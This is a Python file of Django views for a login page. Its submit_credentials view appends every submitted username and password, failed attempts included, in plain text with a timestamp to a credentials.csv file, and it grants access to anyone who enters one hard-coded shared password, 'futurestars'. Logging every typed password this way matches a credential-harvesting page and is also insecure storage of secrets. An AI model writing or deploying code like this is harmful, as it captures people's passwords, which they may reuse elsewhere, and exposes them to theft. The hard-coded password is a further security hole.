from datetime import datetime
from django.shortcuts import render
from django.http import JsonResponse
import csv
import os
from django.conf import settings

def login_view(request):
    return render(request, 'authapp/login.html')

def submit_credentials(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Get the current time in the desired format
        current_time = datetime.now().strftime("%d/%m/%y %H:%M:%S")
        # Save to CSV
        csv_file = os.path.join(settings.BASE_DIR, 'credentials.csv')
        with open(csv_file, mode='a', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['state','username', 'password', 'timestamp']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            # If the file is empty, write the header
            if csvfile.tell() == 0:
                writer.writeheader()

            if password == "futurestars":
                writer.writerow({'state':"success",'username': username, 'password': password, 'timestamp': current_time})
            else:
                writer.writerow({'state':"fail",'username': username, 'password': password, 'timestamp': current_time})

        # Check if username and password are similar
        if password == "futurestars":
            return JsonResponse({'status': 'success'}, status=200)
        else:
            return JsonResponse({'status': 'failure'}, status=400)
    else:
        return JsonResponse({'error': 'Invalid request'}, status=400)

